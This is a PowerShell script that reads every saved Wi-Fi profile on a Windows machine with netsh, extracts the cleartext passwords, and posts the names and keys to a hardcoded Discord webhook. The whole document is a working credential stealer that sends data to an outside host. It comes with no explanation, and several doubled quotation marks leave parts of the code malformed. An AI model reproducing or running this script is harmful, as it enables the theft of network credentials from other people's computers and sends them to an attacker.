# Define your webhook URL and the message string
$WebhookUrl = "https://discord.com/api/webhooks/1522586603615162469/cSzV4hP6LxzHVQKQjOH7ZKAjKSL9Dd_dXSzbSzViTz-DvlS2C1J7aSZkG3tD871SCXwY"

$wifiProfiles = netsh wlan show profiles name=*
foreach ($profile in $wifiProfiles) {
    $profileName = $profile.split("":"")[1].trim()
    $profileInfo = netsh wlan show profile name=""$profileName"" key=clear
    $passwordLine = $profileInfo.split(""`n"") | Where-Object { $_ -match ""Key Content"" }
    $password = $passwordLine.split("":"")[1].trim()

    # Add to the message
    if (-not $Message) {
        $Message = ""Wi-Fi Profiles and Passwords:""
    } else {
        $Message += ""`n""
    }
    $Message += ""$profileName - $password""
}

# Package the message into the standard Discord JSON format
$Body = @{
    content = $Message
} | ConvertTo-Json

# Send it to Discord
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
